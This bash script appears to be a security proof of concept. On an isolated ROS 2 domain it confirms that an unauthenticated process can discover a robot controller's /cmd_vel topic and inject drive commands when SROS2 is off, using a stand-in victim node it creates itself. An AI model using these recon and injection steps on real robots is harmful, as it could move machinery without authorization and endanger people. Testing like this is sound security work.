#!/bin/bash
# Empirically verify the S4 precondition: on a DEFAULT ROS 2 (Jazzy, Fast-DDS, no SROS2),
# an unprivileged process with NO credentials can (1) discover the robot's control topic and
# (2) publish to it, and the message is delivered. Runs in an ISOLATED ROS_DOMAIN_ID (99) so
# it never touches the experiment on domain 0.
set +e
source /opt/ros/jazzy/setup.bash
source /home/jim/ros2_motion_planning_tutorials/install/setup.bash 2>/dev/null
export ROS_DOMAIN_ID=99
unset ROS_SECURITY_ENABLE ROS_SECURITY_STRATEGY   # ensure security OFF (default)
OUT=/home/jim/ros2_motion_planning_tutorials/scratchpad
VICT=$OUT/victim_recv.log
: > "$VICT"

echo "=== ENV: security material present? ==="
echo "ROS_SECURITY_ENABLE=${ROS_SECURITY_ENABLE:-<unset=OFF>}  ROS_DOMAIN_ID=$ROS_DOMAIN_ID  RMW=${RMW_IMPLEMENTATION:-rmw_fastrtps_cpp}"

# ---- VICTIM (robot): a subscriber on /cmd_vel, started as its own process ----
cat > /tmp/victim_node.py <<'PY'
import rclpy
from rclpy.node import Node
from geometry_msgs.msg import Twist
class Victim(Node):
    def __init__(self):
        super().__init__('robot_base_controller')     # pretends to be the robot's controller
        self.create_subscription(Twist, '/cmd_vel', self.cb, 10)
        self.get_logger().info('victim up: subscribing /cmd_vel (no auth configured)')
    def cb(self, m):
        print(f'VICTIM_RECEIVED linear.x={m.linear.x:.2f} angular.z={m.angular.z:.2f}', flush=True)
rclpy.init(); n=Victim()
try: rclpy.spin(n)
except KeyboardInterrupt: pass
PY
python3 /tmp/victim_node.py >> "$VICT" 2>&1 &
VPID=$!
sleep 6

echo ""
echo "=== ATTACKER step 1 — unauthenticated RECON (separate process, no credentials) ==="
echo "-- ros2 node list (discovers the robot node):"
ros2 node list 2>/dev/null | grep -i "robot_base_controller" || echo "  (node not seen yet)"
echo "-- ros2 topic list | /cmd_vel:"
ros2 topic list 2>/dev/null | grep -x "/cmd_vel" && echo "  -> attacker discovered the control topic"

echo ""
echo "=== ATTACKER step 2 — inject cmd_vel (drive command), NO auth ==="
timeout 6 ros2 topic pub -r 5 /cmd_vel geometry_msgs/msg/Twist '{linear: {x: 1.5}, angular: {z: 0.0}}' >/dev/null 2>&1 &
PPID_=$!
sleep 5
kill $PPID_ 2>/dev/null

sleep 1
echo ""
echo "=== RESULT — did the victim receive the attacker's injected command? ==="
RECV=$(grep -c "VICTIM_RECEIVED linear.x=1.50" "$VICT")
echo "victim received $RECV injected 1.50 m/s commands"
grep -m2 "VICTIM_RECEIVED" "$VICT"
kill $VPID 2>/dev/null
pkill -9 -f victim_node.py 2>/dev/null
echo ""
if [ "$RECV" -gt 0 ]; then
  echo "VERDICT: CONFIRMED — unprivileged process injected /cmd_vel with no authentication (SROS2 off)."
else
  echo "VERDICT: not delivered (unexpected)."
fi
echo "DDS_DEMO DONE"
